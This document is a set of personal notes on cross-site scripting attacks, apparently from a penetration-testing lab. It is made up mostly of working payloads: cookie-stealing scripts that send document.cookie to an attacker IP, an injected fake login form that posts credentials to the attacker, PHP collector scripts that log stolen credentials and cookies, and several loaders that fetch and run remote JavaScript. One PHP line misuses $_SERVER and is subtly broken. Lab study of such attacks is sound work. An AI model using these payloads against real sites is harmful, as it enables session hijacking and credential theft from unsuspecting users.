XSSstrike good tool to usepy
```
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py
```

```
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 
```


> [!Payload all the things]
> 
> https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md

> [!payloadbox]
> https://github.com/payloadbox/xss-payload-list

Easy test or XSS

```
<plaintext>
```
or
```
<script>print()</script>
```


```
<script>new Image().src='http://10.10.15.175/index.php?c='+document.cookie</script>
```


Common JavaScript functions to write to DOM objects are
document.write()
DOM.innerHTML
DOM.outerHTML

JQuery library functions that write to DOM objects are
add()
after()
append()

DOM attacks
```
<img src="" onerror=alert(window.origin)>
```

```
<img src="#" onerror="document.location='http://10.10.15.175/?cookie='+document.cookie">

```

Add a login form to the webserver to pass creds back to your server.

```
document.write('<h3>Please login to continue</h3><form action=http://10.10.15.175><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');

```


index.php server file in /tmp/tmpserver ( replace SERVER_IP with IP from target webserver)
```
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://10.129.132.217/phishing/index.php");
    fclose($file);
    exit();
}
?>


```

```
mkdir /tmp/tmpserver
cd /tmp/tmpserver
vi index.php #at this step we wrote our index.php file
sudo php -S 0.0.0.0:80



```

loading a remote script

```
<script src="http://OUR_IP/script.js"></script>

```

```
<script src=http://10.10.15.175></script>
'><script src=http://10.10.15.175></script>
"><script src=http://10.10.15.175></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://10.10.15.175\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//10.10.15.175");a.send();</script>
<script>$.getScript("http://10.10.15.175")</script>


```

```
<script src=http://10.10.15.175/profilepicture></script>

'><script src=http://10.10.15.175/script.js></script>

"><script src=http://10.10.15.175/username></script>


javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')

<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>


<script>$.getScript("http://OUR_IP")</script>


```

cookie request
```
document.location='http://10.10.15.175/index.php?c='+document.cookie;
new Image().src='http://10.10.15.175/index.php?c='+document.cookie;
```

PHP server for cookie grab.

```
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "10.129.132.217: {$_SERVER['10.10.15.175']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>

```